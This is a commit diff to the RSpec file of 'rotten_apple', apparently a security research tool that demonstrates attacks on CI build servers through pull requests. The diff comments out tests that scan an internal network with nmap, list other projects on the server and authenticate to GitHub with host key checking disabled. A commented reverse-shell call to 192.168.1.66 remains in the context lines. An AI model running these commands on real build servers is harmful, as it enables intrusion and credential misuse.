6b9f93c4919228b6f29de60e4ef1567fa6b8d70e
Jonathan Claudius <jclaudius@trustwave.com>
2013-04-14 18:17:10 -0500

    I built a pull request

--- spec/rotten_apple_spec.rb
+++ spec/rotten_apple_spec.rb
@@ -15,16 +15,20 @@ describe RottenApple::Attack do
     # subject.reverse_shell('192.168.1.66', 443)
     #end
 
-    it "should perform an NMAP scan" do
-      subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 192.168.1.0/24')
-    end
+    #it "should perform an NMAP scan" do
+    #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 192.168.1.0/24')
+    #end
 
-    it "should list the other projects built on this server" do
-      subject.command('ls ../../')
-    end
+    #it "should list the other projects built on this server" do
+    #  subject.command('ls ../../')
+    #end
 
-    it "should allow me to authenticate to github" do
-      subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
+    #it "should allow me to authenticate to github" do
+    #  subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
+    #end
+    
+    it "should build a pull request" do
+      puts "I built a pull-request"
     end
   end
 
